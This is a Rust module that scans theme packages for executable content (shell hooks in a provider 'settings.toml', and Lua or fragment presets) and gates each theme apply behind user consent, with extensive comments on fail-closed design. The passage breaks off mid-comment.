//! What a theme package carries that can run code when it is applied
//! (`odd/tasks/theme-package-trust.md`, W1 — detect, W2 — the consent
//! gate below): [`inspect_theme_package`] reads a package, and
//! [`TrustGate`] decides whether an apply attempt proceeds, holds for
//! the warning, or is blocked behind it.
//!
//! A theme folder is UNTRUSTED input. Two things inside it execute when the
//! theme is applied:
//!
//! - A provider `settings.toml` (the shipped one is `noctalia-v5`) may carry
//!   a `[hooks]` section whose values are shell commands. The apply copies
//!   that file VERBATIM over the live one and then reloads, so a packaged
//!   hook runs on apply.
//! - A preset under `presets/<category>/` is installed into the user preset
//!   store (`PRESET_EXTENSIONS`: `*.lua` and `*.frag`) and — in the
//!   `animations` and `borders` categories — `cat`ed unvalidated into the
//!   assembled `overlay.lua` that Hyprland `dofile`s, so a `.frag` there
//!   runs Lua exactly like a `.lua`. Under `shaders/` the file content is
//!   never `cat`ed (see the filter), so it is not reported.
//!
//! [`inspect_theme_package`] reports both so the warning (W2) can word itself
//! from facts: the hook KEYS with their COMMAND TEXT, and the presets with
//! their NAMES AND BODIES. The body is part of the report because it is part
//! of what EXECUTES — the apply copies the file as it is on disk — so a theme
//! that keeps a preset's name and rewrites its body is a different package
//! and must warn again (W2c: the blocker a dual verification refuted).
//!
//! Honest limit, stated here and in the warning itself: this report feeds a
//! CONSENT GATE, not a sandbox. It says what a package carries; it cannot
//! make an accepted theme harmless — if the keeper confirms, the theme's code
//! runs as him.
//!
//! Contract of this module: PURE and READ-ONLY (no write, no directory is
//! ever created) and TOTAL — a missing, unreadable, malformed, empty or
//! non-UTF8 file never panics: a MISSING file narrows the report to nothing
//! (a theme that carries no `settings.toml` carries no hooks), an
//! unreadable or malformed one widens it to one conservative entry. A
//! provider `settings.toml` is parsed with a REAL TOML parser (`toml`,
//! spec 1.1), never read line by line (W1d: three rounds of line-based
//! patches were each refuted with a real blocker, so the class goes, not
//! one more spelling), and it FAILS CLOSED on BOTH ways a file can defeat
//! the read: a file that does not parse is reported as one conservative
//! entry (`push_unparsed_hooks`) and a file the READER REFUSED — over
//! bound, not a regular file, unreadable — as one conservative entry too
//! (`push_uninspectable_hooks`), never as an empty report, because the gate
//! warns only when the report is non-empty and a silent gate over a file
//! nobody inspected is CRITICAL-1 with a different spelling. The one case
//! that stays silent is a path that names no file at all (missing or
//! dangling): there is nothing to inspect, and the apply's own copy of
//! that same path cannot open it either — same user, same path — so no
//! hook can run from it.

use std::path::{Path, PathBuf};

/// The `key` of a CONSERVATIVE report entry: a `settings.toml` that does not
/// parse, or that the reader refused, appears as one entry with this key
/// instead of an empty list. It names a TABLE, never an event that runs, and
/// it is the single marker that tells a consumer this report is INCOMPLETE —
/// what it describes is a file nobody read.
pub const UNINSPECTED_HOOK_KEY: &str = "hooks table";

/// One shell hook a provider's `settings.toml` declares.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHook {
    /// The provider directory that carries the file (e.g. `noctalia-v5`).
    pub provider: String,
    /// The `[hooks]` key (`started`, `colors_changed`, `shutdown`, …) as
    /// the parser names it (`"\u0073tarted"` IS `started`). The ONE
    /// exception is a CONSERVATIVE entry — a `settings.toml` that does not
    /// PARSE (`push_unparsed_hooks`) or that the reader REFUSED
    /// (`push_uninspectable_hooks`) — whose key is the literal
    /// `hooks table` (a note about a file nobody inspected, never an event
    /// that runs).
    pub key: String,
    /// The command text exactly as the parser hands it to the shell:
    /// escapes applied, a multi-line string keeping every line AND its
    /// trailing newline (the old line reader trimmed it — that was a
    /// display choice, not the command Noctalia runs). For the
    /// conservative entry it is the honest statement that the file could
    /// not be inspected (file + cause), not a command.
    pub command: String,
}

/// The largest preset body the scan carries IN FULL: 16 KiB, about five
/// times the largest preset this project ships (the shaders), so a real
/// preset always fits. A body over this bound is reported as
/// [`PresetBody::Unreadable`] instead of being truncated — a truncated
/// comparison would make two DIFFERENT long bodies compare equal, which is
/// the collision this whole store exists to avoid.
pub const MAX_PRESET_BODY_BYTES: usize = 16 * 1024;

/// How many bytes ONE store entry costs beyond its own field values: the
/// table header, the field NAMES, the quoting, the separators and the
/// newlines. Charged per hook and per preset so a budget measured here
/// covers what a store WRITES, not only what the code is.
///
/// Measured, not guessed: 80 bytes is the per-entry overhead this store's own
/// format showed on the reviewers' reproductions (~67 measured, rounded up),
/// and it is what makes the arithmetic below hold — see
/// [`ThemeTrustReport::remembered_bytes`].
const STORE_ENTRY_OVERHEAD_BYTES: usize = 80;

/// The most code ONE theme may contribute to a report, and therefore to what
/// a store can remember.
///
/// Why a second bound at all: a bound per ITEM with no bound per THEME is
/// half a bound. Without this one, a single legal theme (the package bounds
/// are 4 MiB per file and 64 MiB in total) could ask a store to remember
/// megabytes — which is exactly how the store outgrew its own reader and lost
/// every acceptance on the machine. Both re-judges of the fix confirmed that
/// defect with measurements; this bound is the answer to it, and
/// [`ThemeTrustReport::remembered_bytes`] is what a consumer checks against.
///
/// The arithmetic that makes it sufficient, so nobody has to re-derive it:
/// every entry's counted cost includes the format's per-entry overhead AND the
/// theme name at its worst-case escaping (six characters per byte), so a
/// report inside this budget holds at most `budget` of counted values, and the
/// serializer writes at most six characters per counted value byte:
/// `6 × 128 KiB + 128 KiB ≈ 896 KiB`, comfortably inside the store's 2 MiB
/// write bound. A theme inside this budget therefore CANNOT be the reason a
/// store refuses to be written.
///
/// That last sentence has been wrong twice, and both times the reason was a
/// field the budget did not count: first the file names and hook keys, then
/// the theme NAME the serializer repeats in every entry's header. Anything
/// added to the store's written shape must be charged here in the same commit
/// that writes it.
pub const MAX_REMEMBERED_THEME_BYTES: usize = 128 * 1024;

/// A preset's content, as far as the scan could read it.
///
/// The BODY is what matters and this is why the detector carries it: the
/// apply copies the file AS IT IS ON DISK into the user preset store, and
/// (`animations`, `borders`) the assembled `overlay.lua` `dofile`s it — so
/// the body is executable content exactly like a hook's command text. A
/// report that named the file but not its body would let an accepted theme
/// be rewritten in silence (`W2c`, the blocker the dual verification
/// refuted).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PresetBody {
    /// The whole file, verbatim.
    Text(String),
    /// The file could not be read IN FULL — over
    /// [`MAX_PRESET_BODY_BYTES`], unreadable, not a regular file, not
    /// UTF-8. The string says why, for the warning to show; a report
    /// carrying this is never rememberable (see
    /// [`ThemeTrustReport::is_uninspected`]).
    Unreadable(String),
}

/// The worst-case cost of ONE byte of text in the store's format: a control
/// byte is written as `\u00XX`, six characters. Measured against the real
/// serializer (the verification that found the theme name escaping the budget
/// measured exactly 6×), and it is what makes every budget below an UPPER
/// BOUND of what the store writes rather than a guess.
const TOML_WORST_CASE_BYTE_COST: usize = 6;

/// What ONE hook entry costs the theme budget: the provider, the event key and
/// the command text, plus the store format's per-entry overhead and the theme
/// name the serializer repeats in the entry's own table header.
///
/// ONE function, used both by [`ThemeTrustReport::remembered_bytes`] and by
/// the scan that spends the budget, so the two can never disagree about what
/// "inside the budget" means — two currencies for one budget was a real defect
/// this contract found twice, the second time in the theme NAME.
fn hook_bytes(hook: &ShellHook, key_cost: usize) -> usize {
    hook.provider.len()
        + hook.key.len()
        + hook.command.len()
        + STORE_ENTRY_OVERHEAD_BYTES
        + key_cost
}

/// What ONE preset entry costs the theme budget, for a body of `body_len`
/// bytes. The same ONE-currency rule as [`hook_bytes`].
fn preset_entry_bytes(category: &str, file_name: &str, body_len: usize, key_cost: usize) -> usize {
    category.len() + file_name.len() + body_len + STORE_ENTRY_OVERHEAD_BYTES + key_cost
}

/// What the store's own syntax costs PER ENTRY for a theme whose name is
/// `theme_name`: the serializer writes the (escaped) name in every entry's
/// table header, so a long name is charged once per entry, not once per theme.
fn store_key_cost(theme_name: &str) -> usize {
    theme_name.len() * TOML_WORST_CASE_BYTE_COST
}

/// One preset file the package carries under `presets/<category>/` that the
/// report must name: every `*.lua`, plus a `*.frag` in a category the apply
/// `cat`s (the field keeps the name `lua_presets` — the gate's shape is
/// fixed; see the filter in [`lua_presets`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LuaPreset {
    /// The preset category directory (`animations`, `borders`, `shaders`).
    pub category: String,
    /// The file name (`Space.lua`, `evil.frag`).
    pub file_name: String,
    /// What the file contains, or why it could not be read in full. Part of
    /// the report BECAUSE it is part of what executes: a theme that keeps
    /// this name and rewrites this body is a different package.
    pub body: PresetBody,
}

impl LuaPreset {
    /// The theme-relative location of the preset (`presets/animations/x.lua`).
    pub fn theme_relative_path(&self) -> PathBuf {
        Path::new(crate::theme_presets::PRESETS_DIR)
            .join(&self.category)
            .join(&self.file_name)
    }
}

/// What a theme package carries that can execute when it is applied.
///
/// Shaped so the warning (W2) can be worded directly from it: the hook keys
/// and command texts under [`shell_hooks`](Self::shell_hooks), the preset
/// names and paths under [`lua_presets`](Self::lua_presets).
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct ThemeTrustReport {
    /// Every hooks command of every `providers/*/settings.toml` — the
    /// STRING entries of the ROOT `hooks` table, however it is spelled
    /// (`[hooks]`, the dotted `hooks.*` key, `hooks = { … }`) — in
    /// provider-directory order (sorted) and document order inside a file.
    /// A file that does not parse as TOML AND a file the reader REFUSED
    /// (over bound, not a regular file, unreadable) each appear as ONE
    /// clearly-named conservative entry (key `hooks table`, stating file +
    /// cause) instead of an empty list: FAIL CLOSED, so the gate never
    /// stays silent over a file it did not inspect. The only silent case
    /// is a `settings.toml` that does not exist — a path with no file has
    /// nothing to inspect, and the apply's own copy of that path cannot
    /// open it either, so no hook can run from it.
    pub shell_hooks: Vec<ShellHook>,
    /// Every preset file under `presets/<category>/` the report must name —
    /// what the apply installs AND can execute: `*.lua` anywhere, plus
    /// `*.frag` in the categories whose fragment the scripts `cat` into
    /// `overlay.lua` — in [`crate::theme_presets::CATEGORIES`] order and
    /// file-name order inside a category (deterministic, so a warning reads
    /// the same twice).
    pub lua_presets: Vec<LuaPreset>,
}

impl ThemeTrustReport {
    /// Whether the package carries neither shell hooks nor Lua presets: such
    /// a theme applies exactly as it did before this detector existed.
    pub fn is_empty(&self) -> bool {
        self.shell_hooks.is_empty() && self.lua_presets.is_empty()
    }

    /// Whether any part of the package could NOT be read in full — the
    /// report then carries a CONSERVATIVE hook entry
    /// ([`UNINSPECTED_HOOK_KEY`]) or a preset body that says why it could
    /// not be read ([`PresetBody::Unreadable`]), instead of the truth about
    /// a file nobody read.
    ///
    /// Consumers must treat such a report as strictly weaker than a full
    /// one. The gate itself only needs "non-empty" (it warns either way),
    /// but nothing may REMEMBER it: a file HVE could not read can change
    /// inside without the report changing, so a remembered acceptance of it
    /// would silence a warning over content nobody ever judged (W2c, S1).
    pub fn is_uninspected(&self) -> bool {
        self.shell_hooks
            .iter()
            .any(|h| h.key == UNINSPECTED_HOOK_KEY)
            || self
                .lua_presets
                .iter()
                .any(|p| matches!(p.body, PresetBody::Unreadable(_)))
    }

    /// How many bytes of a stored entry this report accounts for: EVERY field
    /// a store writes — the hook's provider, key and command text, the
    /// preset's category, file name and body, the per-entry overhead of the
    /// format itself, AND the theme name the serializer repeats in every
    /// entry's table header — not only the code that runs.
    ///
    /// `theme_name` must be the SAME name the store will be given for this
    /// report: it is charged once per entry, because
    /// `[[accepted."<name>".presets]]` carries it on every one of them.
    ///
    /// Why every field, and why an overhead and a name: a budget that counts
    /// only the code undercounts what the store holds, and a theme carrying
    /// thousands of long file names, hook keys, or a long NAME could then be
    /// "inside" the budget while the entry it produces is megabytes. This
    /// method has been wrong twice for exactly that reason — first counting
    /// code bytes instead of written bytes (10,000 presets of one-byte bodies
    /// and 200-character names counted 10,000 and serialized to 2.67 MB), then
    /// omitting the name (a 255-byte name plus 1,348 empty presets counted
    /// 130,994 and serialized to 2.17 MB). The rule is "what a store writes",
    /// and it is the only rule.
    ///
    /// A consumer must refuse to remember a report over
    /// [`MAX_REMEMBERED_THEME_BYTES`]: a theme the store cannot afford is a
    /// theme whose decision is not remembered, and the warning has to say so
    /// instead of promising a silence that will not come.
    ///
    /// `Unreadable` entries contribute nothing — nothing is ever remembered
    /// for them.
    pub fn remembered_bytes(&self, theme_name: &str) -> usize {
        let key_cost = store_key_cost(theme_name);
        let hooks: usize = self
            .shell_hooks
            .iter()
            .map(|h| hook_bytes(h, key_cost))
            .sum();
        let presets: usize = self
            .lua_presets
            .iter()
            .map(|p| match &p.body {
                PresetBody::Text(text) => {
                    preset_entry_bytes(&p.category, &p.file_name, text.len(), key_cost)
                }
                PresetBody::Unreadable(_) => 0,
            })
            .sum();
        hooks + presets
    }
}

/// Read `theme_dir` and report what the package carries. READ-ONLY: nothing
/// is written and no directory is created, for any input — a theme path that
/// does not exist simply yields an empty report.
pub fn inspect_theme_package(theme_dir: &Path) -> ThemeTrustReport {
    let shell_hooks = shell_hooks(theme_dir);
    // W2c-c: the report spends at most [`MAX_REMEMBERED_THEME_BYTES`] of code
    // on one theme. Hooks are always reported IN FULL (the warning shows
    // their command text, and hiding one would be worse than a large report),
    // so they are counted first and the preset bodies are what the budget
    // stops. A theme whose hooks alone exceed the budget is therefore still
    // reported whole — and `remembered_bytes` is what tells a consumer it
    // must not be remembered.
    // The name the store will repeat in EVERY entry's table header, derived
    // from the directory the caller handed us — the same name it must pass to
    // `remembered_bytes`. Charged here too, so the scan's own budget and the
    // report's number are the same currency.
    let key_cost = store_key_cost(
        &theme_dir
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default(),
    );
    let spent: usize = shell_hooks.iter().map(|h| hook_bytes(h, key_cost)).sum();
    ThemeTrustReport {
        shell_hooks,
        lua_presets: lua_presets(theme_dir, spent, key_cost),
    }
}

/// The `[hooks]` commands of every `providers/<provider>/settings.toml`.
/// A missing file is the normal shape (only `noctalia-v5` writes one) and
/// reports NOTHING — a theme that carries no settings file carries no
/// hooks. A file the READER REFUSED reports the conservative "could not be
/// inspected" entry instead (W1d-b, fail closed).
fn shell_hooks(theme_dir: &Path) -> Vec<ShellHook> {
    let mut out = Vec::new();
    let Ok(entries) = std::fs::read_dir(theme_dir.join("providers")) else {
        return out;
    };
    let mut providers: Vec<PathBuf> = entries
        .flatten()
        .map(|entry| entry.path())
        .filter(|path| path.is_dir())
        .collect();
    providers.sort();
    for provider_dir in providers {
        let provider = provider_dir
            .file_name()
            .map(|name| name.to_string_lossy().into_owned())
            .unwrap_or_default();
        if provider.is_empty() {
            continue;
        }
        let settings = provider_dir.join("settings.toml");
        // W10b: the theme's `settings.toml` is an UNTRUSTED file, and W10
        // owns the ONE set of limits and the ONE error type. W1d-b splits
        // the two ways this read can come up empty:
        //
        // - MISSING (the path names no file): the normal shape — a theme
        //   that carries no settings file carries no hooks, so it reports
        //   nothing and a clean theme never warns (acceptance 2). This is
        //   NOT a refusal: the apply's own `fs::copy` of that same path
        //   cannot open it either (same user, same path), so no hook can
        //   run from a file that does not exist.
        // - REFUSED (the file EXISTS and the reader said no: over bound,
        //   not a regular file, unreadable — every `Err` it can return):
        //   a file nobody inspected, and the report must say so. This is
        //   the SAME conservative entry a parse failure produces — "I
        //   could not inspect this file", never "this carries a hook" —
        //   because an empty report over a file nobody read is the silent
        //   gate this detector exists to prevent.
        //
        //   Honest bound: for the over-bound and non-regular classes the
        //   apply ALREADY refuses the verbatim copy (`theme_file_is_bounded`,
        //   W10c), so a hook there cannot reach the live config either. This
        //   entry is defence in depth, not the only wall — and it is required
        //   anyway, because the gate layer must not depend on another
        //   module's guard staying in place.
        if !settings.exists() {
            continue;
        }
        match crate::theme_media::read_theme_record(&settings) {
            Ok(text) => out.extend(hooks_in_settings(&text, &provider, &settings)),
            Err(e) => {
                // The refusal detail goes to the LOG; the report gets the
                // conservative entry (the full error text is free-form and
                // can be long — the report states file + cause compactly).
                tracing::warn!(
                    "[theme-trust] could not inspect {} (reported as uninspected): {}",
                    settings.display(),
                    e
                );
                out.push(push_uninspectable_hooks(&provider, &settings, &e));
            }
        }
    }
    out
}

/// The hooks one `settings.toml` text declares, in FILE order, read with a
/// REAL TOML parser (`toml` 1.1, spec 1.1 — the parser family this repo's
/// lockfile already carried transitively). A hand-written line reader had
/// two failure modes that both reached the gate as LIES, and three rounds
/// of line-based patches were each refuted with a blocker; parsing the
/// document is the class fix, not another spelling:
///
/// - a header-shaped line inside an untracked multi-line string (the
///   `note = """ … [other] … """` hider) lost the document-root state and
///   hid a real `hooks.started` behind a SILENT gate — CRITICAL-1 again;
/// - the same hider the other way (`note = """ … [hooks] … """`) reported
///   a hook for text that is only a string, holding a CLEAN theme behind a
///   fake warning.
///
/// What the parser gives for free, correctly and permanently: `[hooks]`
/// under every header spelling (quoted, escaped, spaced), the root dotted
/// key (`hooks.started`), the root inline table (same-line AND multi-line
/// — both valid TOML 1.1), a UTF-8 BOM (measured: `toml` 1.1.2 ACCEPTS one
/// at the start of the document), sub-tables, and `[other]`'s own
/// `hooks.started` correctly NOT being root hooks.
///
/// Only the ROOT `hooks` TABLE is read, and only its STRING entries with a
/// non-empty value are hooks. The gate's consumers deserialize a flat
/// string map, so a sub-table (`started = { … }`) is configuration — a
/// real parser refuses a nested table where a command string is expected,
/// so nothing executes from it — and a bool/number/array is data too. The
/// old line reader reported `hooks.enabled = true` as the command `"true"`
/// (a false positive that nagged the keeper over nothing, in the safe
/// direction); it is gone here, and dropping it is RIGHT because Noctalia
/// never executes a non-string value as a command.
///
/// FAIL CLOSED, now honest: a file that does not parse cannot be claimed
/// as inspected, so it yields exactly ONE conservative entry (the file and
/// the cause) instead of an empty report. The honest limit, stated here
/// because a false claim in a security comment is itself a defect: a file
/// that does not parse as TOML here is (barring a parser-version
/// difference) also a file Noctalia's own parser would reject, so nothing
/// executes FROM it — the entry is "I could not inspect this", NOT "this
/// carries a hook". It still must warn: the keeper cannot consent to what
/// nobody inspected, and a report that reads EMPTY over a file nobody read
/// is silent in the one place silence is fatal.
fn hooks_in_settings(text: &str, provider: &str, file: &Path) -> Vec<ShellHook> {
    let document: toml::Value = match toml::from_str(text) {
        Ok(document) => document,
        Err(error) => {
            // The full parser error goes to the LOG, never to the
            // user-visible text (it is free-form and can be long).
            tracing::warn!(
                "[theme-trust] {} does not parse as TOML (not inspected): {}",
                file.display(),
                error
            );
            return vec![push_unparsed_hooks(provider, file)];
        }
    };
    // The ROOT `hooks` table only: `[[hooks]]` is an array of tables and a
    // `hooks` scalar is not a table — neither is the map Noctalia
    // deserializes its commands from, so both read as no hooks.
    let Some(hooks) = document.get("hooks").and_then(toml::Value::as_table) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for (key, value) in hooks {
        // A command is a STRING; every other value under the table is data.
        let Some(command) = value.as_str() else {
            continue;
        };
        // An empty value is not a hook (the command text stays verbatim).
        if command.trim().is_empty() {
            continue;
        }
        out.push(ShellHook {
            provider: provider.to_string(),
            key: key.clone(),
            command: command.to_string(),
        });
    }
    out
}

/// The conservative report entry for a PARSE failure (see
/// `hooks_in_settings`) — one of the two conservative spellings, the other
/// being a reader refusal (`push_uninspectable_hooks`). The detector cannot
/// claim to have inspected a document no parser can read, so instead of an
/// empty report — the gate warns only when the report is non-empty — it
/// emits this entry. It names a TABLE, not an event (`key` is
/// `hooks table`, so the warning line reads as a note, not as a hook that
/// runs), and states the file and the cause. It claims no protection and
/// invents no command: an honest "I could not inspect this", not a sandbox.
fn push_unparsed_hooks(provider: &str, file: &Path) -> ShellHook {
    ShellHook {
        provider: provider.to_string(),
        key: UNINSPECTED_HOOK_KEY.to_string(),
        command: format!(
            "the hooks table in {} could not be read by this scan: \
             the file does not parse as TOML; it may carry shell commands that are not listed here",
            file.display()
        ),
    }
}

/// The conservative report entry for a `settings.toml` the READER REFUSED
/// (W1d-b: over bound, not a regular file, unreadable — every `Err`
/// `read_theme_record` can return; see `shell_hooks`). Same shape and same
/// key as the parse-failure entry, because it is the same HONEST claim: "I
/// could not inspect this file", never "this carries a hook".
///
/// Why it must exist at all: an empty report over a file nobody read is the
/// silent gate this detector is not allowed to have — a parse failure and a
/// read refusal are the same event to the keeper. The honest bound: for a file
/// that is over bound or not a regular file the apply's own preflight
/// (`theme_file_is_bounded`, W10c) refuses the verbatim copy too, so this entry
/// is DEFENCE IN DEPTH for those classes rather than the only wall. It is
/// required regardless: it is the gate layer's own promise and must not depend
/// on another module's guard.
///
/// The cause comes from `ThemeReadError`'s own `Display` (the ONE error
/// type, W10), so every refusal class reads as itself: `larger than the
/// 4194304-byte bound …`, `<path> is not a regular file`,
/// `cannot open <path>: …`, `<path> is not valid UTF-8 text`.
fn push_uninspectable_hooks(
    provider: &str,
    file: &Path,
    cause: &crate::theme_package::ThemeReadError,
) -> ShellHook {
    ShellHook {
        provider: provider.to_string(),
        key: UNINSPECTED_HOOK_KEY.to_string(),
        command: format!(
            "the settings file {} could not be inspected by this scan: {}; \
             it may carry shell commands that are not listed here",
            file.display(),
            cause
        ),
    }
}

/// Every preset file a theme carries under `presets/<category>/` the report
/// must name, in [`crate::theme_presets::CATEGORIES`] order — exactly the
/// directories `install_theme_presets` reads on apply, so the report matches
/// what reaches the user preset store and, from there, `overlay.lua`.
fn lua_presets(theme_dir: &Path, already_spent: usize, key_cost: usize) -> Vec<LuaPreset> {
    let mut out = Vec::new();
    let mut spent = already_spent;
    for category in crate::theme_presets::CATEGORIES {
        let dir = theme_dir
            .join(crate::theme_presets::PRESETS_DIR)
            .join(category);
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut names: Vec<String> = entries
            .flatten()
            .filter(|entry| entry.path().is_file())
            .filter_map(|entry| entry.file_name().to_str().map(str::to_string))
            .filter(|name| is_reported_preset(category, name))
            .collect();
        names.sort();
        out.extend(names.into_iter().map(|file_name| LuaPreset {
            body: preset_body(&dir.join(&file_name), category, &file_name, &mut spent, key_cost),
            category: category.to_string(),
            file_name,
        }));
    }
    out
}

/// Read one preset's body, under the SAME guarded reader every untrusted
/// theme file goes through (its 4 MiB per-file bound, its regular-file
/// predicate, its one error type) and then under TWO budgets: this module's
/// per-preset [`MAX_PRESET_BODY_BYTES`], and the theme-wide
/// [`MAX_REMEMBERED_THEME_BYTES`] the caller tracks in `spent`.
///
/// A file that does not fit either budget is reported as
/// [`PresetBody::Unreadable`] with the cause that stopped it — NEVER
/// truncated (a truncated comparison would make two different bodies compare
/// equal) and never read at all once the theme's budget is spent, which the
/// cause says, because a report that deliberately did not open a file must be
/// honest about it.
fn preset_body(
    path: &Path,
    category: &str,
    file_name: &str,
    spent: &mut usize,
    key_cost: usize,
) -> PresetBody {
    if *spent >= MAX_REMEMBERED_THEME_BYTES {
        return PresetBody::Unreadable(format!(
            "the preset {} was not read by this scan: this package's code already fills the \
             {MAX_REMEMBERED_THEME_BYTES}-byte budget for a theme HVE can remember, so the rest \
             of its presets are not listed here",
            path.display()
        ));
    }
    match crate::theme_package::read_theme_text(path) {
        Ok(text) if text.len() > MAX_PRESET_BODY_BYTES => PresetBody::Unreadable(format!(
            "the preset {} could not be KEPT by this scan: it is {} bytes, over the \
             {MAX_PRESET_BODY_BYTES}-byte bound for a preset HVE can remember, so its contents \
             are not shown here",
            path.display(),
            text.len()
        )),
        Ok(text)
            if *spent + preset_entry_bytes(category, file_name, text.len(), key_cost)
                > MAX_REMEMBERED_THEME_BYTES =>
        {
            // This one WAS read — it just does not fit the budget, and saying
            // "was not read" of a file that was opened would be false.
            PresetBody::Unreadable(format!(
                "the preset {} could not be KEPT by this scan: it would push this package's code \
                 past the {MAX_REMEMBERED_THEME_BYTES}-byte budget for a theme HVE can remember, \
                 so its contents are not shown here",
                path.display()
            ))
        }
        Ok(text) => {
            *spent += preset_entry_bytes(category, file_name, text.len(), key_cost);
            PresetBody::Text(text)
        }
        Err(e) => PresetBody::Unreadable(format!(
            "the preset {} could not be read by this scan: {e}; \
             it may carry code that is not shown here",
            path.display()
        )),
    }
}

/// Whether a preset file name is content the report must name: one of the
/// extensions the apply installs ([`crate::theme_presets::PRESET_EXTENSIONS`],
/// matched case-insensitively like the store), except `shaders/*.frag`.
///
/// THE ASYMMETRY, deliberate and verified against the scripts: `shader.sh`
/// never `cat`s a shader — it writes a validated Lua wrapper naming the
/// built-in shader path, so `shaders/*.frag` bytes reach the GPU as GLSL
/// and never `overlay.lua`, and stay out of the report. In `animations/`
/// and `borders/` the apply resolves the preset BY NAME, content-blind
/// (`hve_resolve_preset`), and `cat`s whatever file it finds into the
/// fragment `assemble.sh` assembles into the `overlay.lua` Hyprland
/// `dofile`s — a `.frag` carrying Lua there executes exactly like a
/// `.lua`. `shaders/*.lua` stays reported: it is Lua, the extension this
/// gate was built to surface.
fn is_reported_preset(category: &str, name: &str) -> bool {
    let Some(ext) = Path::new(name).extension().and_then(|ext| ext.to_str()) else {
        return false;
    };
    if !crate::theme_presets::PRESET_EXTENSIONS
        .iter()
        .any(|installed| ext.eq_ignore_ascii_case(installed))
    {
        return false;
    }
    !(category == "shaders" && ext.eq_ignore_ascii_case("frag"))
}

// ── W2: the consent gate ─────────────────────────────────────────────
//
// Detection alone is inert: every APPLY path must consult it and stop
// when the report is non-empty. The gate is the pure decision layer
// between the detector and the window — it holds an attempt, remembers
// it as pending, and only lets it through once the keeper has confirmed
// the warning (one-shot) or when the package carries nothing risky.
//
// It deliberately holds NO UI state and does NO I/O: the caller
// inspects the package itself, so the report the warning shows and the
// report consulted on the confirmed re-entry are both read fresh from
// disk at that moment. Contract: a theme that carries neither hooks nor
// Lua presets never reaches `Hold` — it applies exactly as it did
// before this module existed.
//
// W2c — the remembered acceptance. Consent is no longer only one-shot:
// the caller keeps a persistent store of what the keeper has already
// accepted (one entry per theme, keyed by the EXACT content of this
// report) and passes that answer in as `already_accepted`, so the gate
// itself never learns where consent is kept. Two rules follow, and both
// fail towards the warning:
//
// - A stored acceptance is consulted ONLY for a non-empty report, so a
//   clean theme's path never depends on the store.
// - The armed confirmation carries the report the warning SHOWED, and
//   proceeds only when the fresh report is identical to it. A package
//   rewired while the modal was up is therefore judged again from
//   scratch instead of applying on consent given to other content.

/// Which apply path an attempt came from (W2 gates both entry points).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApplyOrigin {
    /// `on_gallery_card_clicked` — the gallery card / mosaic tile.
    Gallery,
    /// `on_panel_apply_saved_theme` — the panel Save list.
    Panel,
}

/// An attempt the gate is holding until the keeper decides.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PendingApply {
    /// The theme name the attempt resolved to.
    pub name: String,
    /// The index the original callback received, to re-invoke it on confirm.
    pub index: i32,
    /// Which entry point must be re-invoked to apply after confirmation.
    pub origin: ApplyOrigin,
    /// The report the warning is SHOWING for this attempt (W2c, spec S4).
    /// Kept so the confirmation can be checked against the FRESH report on
    /// re-entry: a package rewired while the modal was up must warn again
    /// instead of applying on consent the keeper gave to other content.
    pub report: ThemeTrustReport,
}

/// What the caller must do with one apply attempt.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GateDecision {
    /// Apply exactly as before: nothing risky, or a confirmed theme.
    Proceed,
    /// Do NOT apply: the warning is now showing for [`TrustGate::pending`].
    Hold,
    /// Do NOT apply: the warning is already open (the gate is modal —
    /// nothing is applied behind it until the keeper decides).
    Blocked,
}

/// One-shot consent state shared by both apply paths.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct TrustGate {
    /// The attempt the warning is currently asking about.
    pending: Option<PendingApply>,
    /// The attempt the keeper confirmed, consumed by the next matching
    /// [`TrustGate::request`] and cleared by [`TrustGate::finish_confirm`].
    /// It carries the report the warning SHOWED, not just the name: the
    /// confirmation is consent for that content, never for a name (W2c, S4).
    confirmed: Option<PendingApply>,
}

impl TrustGate {
    /// A closed gate (no pending attempt, no confirmation).
    pub const fn new() -> Self {
        Self {
            pending: None,
            confirmed: None,
        }
    }

    /// Whether the warning is (or must be) on screen.
    pub fn is_open(&self) -> bool {
        self.pending.is_some()
    }

    /// The attempt being held, for diagnostics.
    pub fn pending(&self) -> Option<&PendingApply> {
        self.pending.as_ref()
    }

    /// The name confirmed but not yet re-entered, for diagnostics.
    pub fn confirmed(&self) -> Option<&str> {
        self.confirmed.as_ref().map(|a| a.name.as_str())
    }

    /// Consult the gate for ONE apply attempt.
    ///
    /// `already_accepted` says whether the keeper has ALREADY accepted
    /// EXACTLY this content (the caller reads the persistent store, so the
    /// gate stays free of I/O and of any knowledge of where consent is
    /// kept). Order matters and is pinned by test: the modal check wins
    /// (nothing applies behind an open warning), then an armed
    /// confirmation, then an empty report (the pre-W2 behaviour, which
    /// `already_accepted` can never change), then a stored acceptance.
    pub fn request(
        &mut self,
        name: &str,
        index: i32,
        origin: ApplyOrigin,
        report: &ThemeTrustReport,
        already_accepted: bool,
    ) -> GateDecision {
        if self.pending.is_some() {
            return GateDecision::Blocked;
        }
        // The armed token is spent on THIS attempt, whatever the outcome:
        // `take` makes it one-shot, so it can never be replayed — and a
        // package rewired while the warning was up fails the comparison
        // below and is judged again from scratch, which is the safe
        // direction (a stale arm costs one more warning, never an apply).
        if let Some(armed) = self.confirmed.take() {
            if armed.name == name && armed.report == *report {
                return GateDecision::Proceed;
            }
        }
        if report.is_empty() {
            return GateDecision::Proceed;
        }
        if already_accepted {
            return GateDecision::Proceed;
        }
        self.pending = Some(PendingApply {
            name: name.to_string(),
            index,
            origin,
            report: report.clone(),
        });
        GateDecision::Hold
    }

    /// The keeper pressed Continue: take the pending attempt and arm the
    /// one-shot confirmation for its name AND its content. The caller
    /// re-invokes the SAME entry point, whose `request` then returns
    /// [`GateDecision::Proceed`] if the package still carries what the
    /// warning showed.
    pub fn begin_confirm(&mut self) -> Option<PendingApply> {
        let pending = self.pending.take()?;
        self.confirmed = Some(pending.clone());
        Some(pending)
    }

    /// Close the one-shot confirmation after the re-invocation returns. A
    /// re-entry that never reached `request` (the mutating guard, a
    /// vanished window) must NOT leave stale consent behind: the next
